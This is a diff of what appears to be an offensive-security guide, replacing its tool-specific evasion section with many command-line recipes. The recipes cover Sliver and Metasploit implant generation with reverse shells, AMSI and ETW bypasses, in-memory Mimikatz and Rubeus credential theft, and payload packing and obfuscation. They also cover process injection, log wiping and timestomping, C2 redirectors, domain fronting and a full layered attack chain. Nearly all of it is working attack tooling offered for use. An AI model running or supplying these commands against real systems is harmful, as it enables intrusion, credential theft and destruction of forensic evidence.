@@ -668,72 +668,476 @@ Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_hi
 
 ## Tool-Specific Evasion
 
-### Metasploit Evasion Modules
+### Sliver C2 Evasion Features 🦞
+
+Sliver has built-in evasion capabilities that should be your first choice for C2 operations.
+
+**Built-in Evasion Flags:**
+
+```sliver
+# Full evasion build
+sliver > generate --name evasive --http 10.10.10.10 --format exe \
+  --skip-symbols \
+  --evasion \
+  --shellcode-entropy 3
+
+# Shellcode with compression and bypass
+sliver > generate --name shell-evade --http 10.10.10.10 --format shellcode \
+  --shellcode-compress \
+  --shellcode-entropy 3 \
+  --shellcode-bypass 2 \
+  --shellcode-exitopt 1
+
+# Service-style implant (blends with Windows services)
+sliver > generate --name svc-host --http 10.10.10.10 --format service
+```
+
+**Evasion Flag Reference:**
+
+| Flag | Description | Effect |
+|------|-------------|--------|
+| `--skip-symbols` | Strip debug symbols | Reduces static analysis signatures |
+| `--evasion` | Enable all evasion features | Combined anti-AV/EDR measures |
+| `--shellcode-compress` | aPLib compression | Reduces shellcode size, evades entropy detection |
+| `--shellcode-entropy 1/2/3` | Entropy obfuscation | 1=none, 2=random names, 3=random+encrypt |
+| `--shellcode-bypass 1/2/3` | Bypass behavior | 1=none, 2=abort on fail, 3=continue |
+| `--shellcode-exitopt 1/2/3` | Exit behavior | 1=exit thread, 2=exit process, 3=block |
+| `--shellcode-headers 1/2` | PE headers | 1=overwrite, 2=keep original |
+
+**Sliver AMSI Bypass (via Armory):**
+
+```sliver
+# Install AMSI bypass extension
+sliver > armory update
+sliver > armory search amsi
+sliver > armory install amsi-bypass
+
+# Execute on target
+sliver (IMPLANT) > execute-extension amsi-bypass
+```
+
+**Sliver ETW Bypass:**
+
+```sliver
+# ETW patching extension
+sliver > armory install etw-patch
+sliver (IMPLANT) > execute-extension etw-patch
+```
+
+**Sliver Memory-Only Execution:**
+
+```sliver
+# Execute .NET assembly in-memory (no disk write)
+sliver (IMPLANT) > execute-assembly /tools/Rubeus.exe kerberoast
+
+# Sideload DLL (inject into current process)
+sliver (IMPLANT) > sideload /tools/mimikatz.dll
+
+# Spawndll (inject into new process)
+sliver (IMPLANT) > spawndll /tools/payload.dll DllMain
+```
+
+**Sliver Network Evasion:**
+
+```sliver
+# Domain fronting via CDN
+sliver > generate --https cdn.cloudflare.com?host-header=legit-site.com --format exe
+
+# DNS C2 (evades network monitoring)
+sliver > dns --domains c2.example.com --lhost 0.0.0.0
+sliver > generate --dns c2.example.com --beacon 300 --jitter 50 --format exe
+
+# WireGuard tunnel (encrypted, looks like VPN)
+sliver > wg --lhost 0.0.0.0 --lport 53
+sliver > generate --wg 10.10.10.10:53 --format exe
+
+# Slow beacon with jitter (low-and-slow C2)
+sliver > generate --http 10.10.10.10 --beacon 600 --jitter 40 --format exe
+```
+
+**Sliver Staged Delivery (Smaller Initial Payload):**
+
+```sliver
+# 1. Create shellcode profile
+sliver > profiles new --name win-stage --http 10.10.10.10 --format shellcode
+
+# 2. Start staging listener
+sliver > stage-listener --url http://10.10.10.10:8080 --profile win-stage --aes-encrypt-key "D(G+KbPeShVmYq3t"
+
+# 3. Generate stager with msfvenom (on Kali)
+$ msfvenom -p windows/x64/custom/reverse_winhttp LHOST=10.10.10.10 LPORT=8080 LURI=/payload.woff -f raw -o stager.bin
+```
+
+---
+
+### Metasploit Evasion (Kali) 🔫
+
+Metasploit provides encoding, staging, and post-exploitation evasion modules.
+
+**Payload Encoding:**
 
 ```bash
-# Metasploit payload evasion
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -e x64/xor_dynamic -i 5 -f exe -o payload.exe
+# Shikata Ga Nai encoder (most common)
+$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 \
+  -e x64/xor_dynamic -i 5 -f exe -o payload.exe
 
-# Use built-in evasion module
-use evasion/windows/windows_defender_exclusion
-set FILENAME legitimate-update.exe
-run
+# Chain multiple encoders
+$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 \
+  -e x64/xor_dynamic -i 3 \
+  -e x64/shikata_ga_nai -i 3 \
+  -f exe -o multi_encoded.exe
+
+# List available encoders
+$ msfvenom --list encoders
+
+# Best x64 encoders:
+# - x64/xor_dynamic    (low entropy, good evasion)
+# - x64/shikata_ga_nai (classic polymorphic)
+# - x64/zutto_dekiru   (polymorphic)
+# - x64/xor_context    (context-based XOR)
 ```
 
-### Sliver C2 Evasion Features
-
-```yaml
-# Sliver generate - evasion options
-sliver > generate --os windows --arch amd64 --format exe --http example.com --evasion
-
-# Sliver stage - AMSI bypass
-sliver > stage-listener --http example.com --profile evading-payload
-
-# Domain fronting with Sliver
-sliver > generate --http https://cdn-fronted-domain.com --dodge
-```
-
-### Cobalt Strike Evasion
+**Metasploit Evasion Modules:**
 
 ```bash
-# Sleep obfuscation profile (resource template)
-set sleep_time "3000";
-set jitter "30";
+$ msfconsole -q
 
-# USB keystroke beacon
-spawn beacon-usb
+# AMSI bypass (post-exploitation)
+msf6 > use post/windows/manage/amsi_bypass
+msf6 (amsi_bypass) > set SESSION 1
+msf6 (amsi_bypass) > run
+
+# ETW patching (disable Event Tracing)
+msf6 > use post/windows/manage/patch_etw
+msf6 (patch_etw) > set SESSION 1
+msf6 (patch_etw) > run
+
+# PowerShell downgrade (avoid ScriptBlock logging)
+msf6 > use post/windows/manage/powershell_downgrade
+msf6 (powershell_downgrade) > set SESSION 1
+msf6 (powershell_downgrade) > run
+
+# Migrate to stable process
+msf6 > run post/windows/manage/migrate
+
+# Enable privileged mode (token manipulation)
+msf6 > use post/windows/escalate/ask
 ```
 
-#### Aggressive OPSEC Profile (Cobalt Strike)
+**Meterpreter In-Memory Tools:**
 
+```bash
+# Load Mimikatz without disk write
+meterpreter > load kiwi
+meterpreter > creds_all
+meterpreter > kerberos_ticket_list
+meterpreter > golden_ticket_create
+
+# Load Python interpreter (in-memory)
+meterpreter > load python
+meterpreter > python_exec "import os; print(os.popen('whoami').read())"
+
+# PowerShell via meterpreter
+meterpreter > load powershell
+meterpreter > powershell_execute "Get-Process | Where-Object {$_.Name -like '*defrag*'}"
 ```
-# opsec.profile
-set sample_name "Windows Update";
 
-process-inject {
-    set minmalloc "0x1000";
-    set remote_malloc "VirtualAlloc";
-    transform-x86 {
-        prepend "\x90\x90\x90";
-        strrep "beacon" "svchost";
-    };
-    transform-x64 {
-        prepend "\x90\x90\x90";
-    };
+**Meterpreter Network Evasion:**
+
+```bash
+# Set up handler with SSL
+msf6 > use exploit/multi/handler
+msf6 (handler) > set PAYLOAD windows/x64/meterpreter/reverse_https
+msf6 (handler) > set LHOST cdn.example.com
+msf6 (handler) > set LPORT 443
+msf6 (handler) > set HttpHostHeader legitimate-site.com
+msf6 (handler) > set StagerVerifySSLCert true
+msf6 (handler) > run
+
+# Communication timeout (reduce traffic frequency)
+msf6 (handler) > set SessionCommunicationTimeout 600
+msf6 (handler) > set SessionExpirationTimeout 604800
+```
+
+**Metasploit Cleanup:**
+
+```bash
+# Clear event logs
+meterpreter > clearev
+
+# Timestomp file
+meterpreter > timestomp C:\Users\Public\implant.exe -z "01/15/2026 08:30:00"
+
+# Remove files
+meterpreter > rm C:\Users\Public\implant.exe
+
+# Remove registry persistence
+msf6 > use post/windows/manage/delete_registry
+msf6 (delete_registry) > set KEY "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor"
+msf6 (delete_registry) > run
+```
+
+---
+
+### Kali Linux Evasion Tools 🐉
+
+Kali provides extensive evasion utilities beyond Metasploit.
+
+**Binary Packing & Obfuscation:**
+
+```bash
+# 1. UPX packing (compresses executable)
+$ upx --best --ultra-brute payload.exe -o packed.exe
+# Note: UPX signatures are well-known, may trigger some AV
+
+# 2. Obfuscator-LLVM (compile-time obfuscation)
+$ git clone https://github.com/obfuscator-llvm/obfuscator
+$ clang -mllvm -sub -mllvm -fla -mllvm -bcf payload.c -o obfuscated
+
+# 3. Hyperion (AES encrypter)
+$ hyperion payload.exe encrypted_payload.exe
+
+# 4. PE Cloak (PE section manipulation)
+$ python pecloak.py -i payload.exe -o cloaked.exe --add-section .null --fill-random
+```
+
+**Shellcode Tools:**
+
+```bash
+# 1. Donut - Convert .NET PE to shellcode
+$ donut -i Rubeus.exe -o rubeus.bin
+$ donut -i Mimikatz.exe -f go -o mimikatz.go  # Output as Go code
+
+# 2. sRDI - Shellcode Reflective DLL Injection
+$ python sRDI.py payload.dll -f go -o shellcode.go
+
+# 3. ShellNoob - Shellcode toolkit
+$ shellnoob -i payload.bin -e x86/shikata_ga_nai -c 3 -o encoded.bin
+
+# 4. Shellgen - Generate custom shellcode
+$ shellgen --arch x64 --os windows --type exec --cmd "calc.exe" -o calc.bin
+```
+
+**PowerShell Obfuscation:**
+
+```bash
+# 1. Invoke-Obfuscation
+$ pwsh
+PS> Import-Module ./Invoke-Obfuscation.psd1
+PS> Invoke-Obfuscation
+# Interactive menu: SET SCRIPTBLOCK > ENCODE > OUTPUT
+
+# 2. ISESteroids obfuscation
+# (Built into commercial ISESteroids extension)
+
+# 3. Manual obfuscation
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Invoke-Mimikatz'))
+# Run: powershell -enc $encoded
+```
+
+**AMSI Bypass Tools:**
+
+```bash
+# 1. Amsi.fail - Generate random bypass one-liners
+$ git clone https://github.com/Flangvik/AMSI.fail
+cd AMSSI.fail
+$ python amsi_fail.py  # Generates random bypass
+
+# 2. AMSI-Bypass-PowerShell
+$ git clone https://github.com/p0shKilleR/AMSI-Bypass-PowerShell
+PS> Import-Module ./AMSI-Bypass.ps1
+PS> AmsiBypass
+
+# 3. SharpAmsi (C# tool)
+$ SharpAmsi.exe bypass
+```
+
+**Direct Syscall Tools:**
+
+```bash
+# 1. SysWhispers2 (generate direct syscalls)
+$ python syswhispers2.py --function NtCreateFile,NtWriteFile -o syscalls
+# Output: syscalls.asm, syscalls.h, syscalls.c
+
+# 2. SysWhispers3 (improved, more functions)
+$ python syswhispers3.py --functions NtCreateThreadEx --out-file syscalls
+
+# 3. Hell's Gate / Halos Gate (runtime syscall resolution)
+$ git clone https://github.com/am0nsec/HellsGate
+$ make
+```
+
+**VM/Sandbox Detection Tools:**
+
+```bash
+# 1. al-khaser (comprehensive VM detection)
+$ git clone https://github.com/LordNoteworthy/al-khaser
+cd al-khaser
+$ make
+$ ./al-khaser
+
+# 2. PAFish (Paranoid Fish)
+$ git clone https://github.com/a0rtega/pafish
+cd pafish
+$ make
+$ ./pafish.exe
+
+# 3. Check VM artifacts manually
+$ dmidecode -t system | grep -i manufacturer
+$ lscpu | grep -i hypervisor
+$ cat /proc/cpuinfo | grep -i hypervisor
+```
+
+**Process Injection Tools:**
+
+```bash
+# 1. Process Hollowing (Python tool)
+$ python process_hollowing.py --payload payload.exe --target svchost.exe
+
+# 2. DLL Injection
+$ python dll_injection.py --dll payload.dll --pid 1234
+
+# 3. Early Bird Injection (process injection via APC)
+$ EarlyBird.exe payload.bin 1234
+```
+
+**Forensics Countermeasures:**
+
+```bash
+# 1. Secure file deletion
+$ srm -z payload.exe        # Overwrite with zeros then delete
+$ shred -vfz -n 5 payload.exe  # 5 passes of random + zeros
+
+# 2. Clear bash history
+$ history -c && history -w
+$ echo "" > ~/.bash_history
+$ unset HISTFILE
+
+# 3. Clear system logs (Linux)
+$ echo "" > /var/log/auth.log
+$ echo "" > /var/log/syslog
+$ journalctl --vacuum-time=1s
+
+# 4. Timestomp file
+$ touch -d "2026-01-15 08:30:00" payload.exe
+$ touch -r /bin/ls payload.exe  # Copy timestamps from legit file
+```
+
+**Network Redirectors:**
+
+```bash
+# 1. SOCAT redirector (hide true C2)
+$ socat TCP4-LISTEN:443,fork TCP4:10.10.10.10:443
+
+# 2. SOCAT UDP redirector (for DNS)
+$ socat UDP4-LISTEN:53,fork UDP4:10.10.10.10:53
+
+# 3. Nginx HTTPS redirector
+# /etc/nginx/sites-available/c2-redirect:
+server {
+    listen 443 ssl;
+    server_name c2.example.com;
+    ssl_certificate /etc/letsencrypt/live/c2.example.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/c2.example.com/privkey.pem;
+    location / {
+        proxy_pass http://10.10.10.10:80;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
 }
+$ ln -s /etc/nginx/sites-available/c2-redirect /etc/nginx/sites-enabled/
+$ nginx -s reload
 
-stage {
-    set checksum "0";
-    set cleanup "true";
-    set compile_time "1 Jan 2020";
-    set entry_point "4096";
-    set image_size "4096";
-    set name "wupdate.exe";
-    set rich_header "\x00";
-    set stomppe "true";
-    set obfuscate "true";
-}
+# 4. iptables DNAT redirector
+$ iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.10.10.10:443
+$ iptables -t nat -A POSTROUTING -p tcp -d 10.10.10.10 --dport 443 -j MASQUERADE
 ```
+
+**Domain Fronting Setup:**
+
+```bash
+# 1. Get domain and CDN setup (Cloudflare example)
+# - Register domain
+# - Add to Cloudflare
+# - Enable "Orange Cloud" (proxy)
+
+# 2. Generate certificate for fronting domain
+$ certbot certonly --manual -d cdn.example.com
+
+# 3. Configure C2 to use domain fronting
+# Sliver: generate --https cdn.example.com?host-header=real-target.cloudflare.com
+# MSF: set HttpHostHeader real-target.cloudflare.com
+```
+
+---
+
+### Evasion Workflow Integration
+
+**Complete Attack Chain with Evasion:**
+
+```
+┌──────────────────────────────────────────────────────────────────┐
+│                    LAYERED EVASION WORKFLOW                       │
+├──────────────────────────────────────────────────────────────────┤
+│                                                                   │
+│  PHASE 1: BUILD                                                  │
+│  ┌─────────────────────────────────────────────────────────────┐ │
+│  │ Sliver:  generate --evasion --skip-symbols --shellcode-    │ │
+│  │          entropy 3 --format shellcode                      │ │
+│  │                                                             │ │
+│  │ MSF:     msfvenom -e x64/xor_dynamic -i 5                  │ │
+│  │                                                             │ │
+│  │ Kali:    UPX pack + donut shellcode conversion              │ │
+│  └─────────────────────────────────────────────────────────────┘ │
+│                              ↓                                    │
+│  PHASE 2: DELIVER                                                │
+│  ┌─────────────────────────────────────────────────────────────┐ │
+│  │ Redirector: SOCAT/Nginx hiding C2 IP                       │ │
+│  │                                                             │ │
+│  │ Domain Fronting: CDN with host-header spoof                 │ │
+│  │                                                             │ │
+│  │ DNS C2: dnscat2 or Sliver DNS listener                      │ │
+│  │                                                             │ │
+│  │ Stager: Small initial payload → pull full implant          │ │
+│  └─────────────────────────────────────────────────────────────┘ │
+│                              ↓                                    │
+│  PHASE 3: EXECUTE                                               │
+│  ┌─────────────────────────────────────────────────────────────┐ │
+│  │ AMSI Bypass:   Sliver armory / MSF amsi_bypass              │ │
+│  │                                                             │ │
+│  │ ETW Patch:     Disable event tracing                        │ │
+│  │                                                             │ │
+│  │ Process:       Migrate to explorer.exe / svchost.exe        │ │
+│  │                                                             │ │
+│  │ Execution:     execute-assembly / sideload (memory-only)    │ │
+│  └─────────────────────────────────────────────────────────────┘ │
+│                              ↓                                    │
+│  PHASE 4: PERSIST / C2                                          │
+│  ┌─────────────────────────────────────────────────────────────┐ │
+│  │ Beacon Mode:   Sliver beacon 600 --jitter 40                │ │
+│  │                                                             │ │
+│  │ WireGuard:     Encrypted tunnel, looks like VPN             │ │
+│  │                                                             │ │
+│  │ LOTL:          Use certutil / PowerShell for comms          │ │
+│  │                                                             │ │
+│  │ P2P:           SMB beacons / named pipes for lateral        │ │
+│  └─────────────────────────────────────────────────────────────┘ │
+│                              ↓                                    │
+│  PHASE 5: CLEANUP                                                │
+│  ┌─────────────────────────────────────────────────────────────┐ │
+│  │ Logs:          clearev / wevtutil cl                        │ │
+│  │                                                             │ │
+│  │ Files:         rm / shred / srm                             │ │
+│  │                                                             │ │
+│  │ Timestamps:     timestomp / touch -r                        │ │
+│  │                                                             │ │
+│  │ Memory:        die / exit cleanly                           │ │
+│  └─────────────────────────────────────────────────────────────┘ │
+│                                                                   │
+└──────────────────────────────────────────────────────────────────┘
+```
+
+---
 
 ---
 
